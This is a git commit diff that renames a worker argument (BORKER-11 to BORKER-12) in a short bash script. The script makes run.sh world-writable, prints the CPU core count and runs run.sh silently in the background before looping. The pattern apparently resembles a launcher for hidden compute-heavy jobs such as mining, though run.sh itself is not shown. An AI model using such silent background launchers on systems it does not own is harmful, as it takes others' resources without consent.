6fb397f05d491dd265901fa6d32bcf05785478b0
andrygibhq02 <andrygibhq02@gmail.com>
2026-04-15 23:30:36 +0700

    Update bas.sh

--- bas.sh
+++ bas.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 BORKER-11 >/dev/null 2>&1 &
+cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 BORKER-12 >/dev/null 2>&1 &
 sleep 30
 while true
 do
